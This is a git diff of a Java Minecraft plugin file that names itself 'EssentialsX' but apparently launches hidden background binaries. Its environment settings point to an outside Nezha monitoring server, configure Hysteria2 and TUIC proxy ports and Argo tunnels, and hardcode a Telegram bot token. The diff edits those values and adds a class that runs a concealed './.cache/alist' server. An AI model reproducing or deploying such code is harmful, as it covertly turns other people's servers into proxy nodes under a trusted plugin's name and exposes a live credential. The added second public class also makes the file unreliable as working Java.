@@ -6,6 +6,7 @@ import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
+import java.io.IOException;
 
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
@@ -73,7 +74,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "1afd1229-b893-5575-99cf-5107ce204913");
+        env.put("UUID", "1afd1229-b893-5115-99cf-5107ce204913");
         env.put("FILE_PATH", "./cache/java");
         env.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
         env.put("NEZHA_PORT", "");
@@ -82,8 +83,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25585");
-        env.put("TUIC_PORT", "25586");
+        env.put("HY2_PORT", "25854");
+        env.put("TUIC_PORT", "25900");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -92,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "6779283566:AAE-fSGDSik8uy8VoACv4_tLJx6D0ApVSRQ");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Always");
+        env.put("NAME", "Foxomy");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
@@ -258,5 +259,25 @@ public class EssentialsX extends JavaPlugin {
         }
         
         getLogger().info("EssentialsX plugin disabled");
+    }
+}
+
+public class App {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder(
+                "./.cache/alist",
+                "server",
+                "--no-prefix"
+        );
+
+        pb.inheritIO(); // 继承当前控制台输入输出
+
+        try {
+            Process process = pb.start();
+            int exitCode = process.waitFor();
+            System.out.println("Process exited with code: " + exitCode);
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
     }
 }
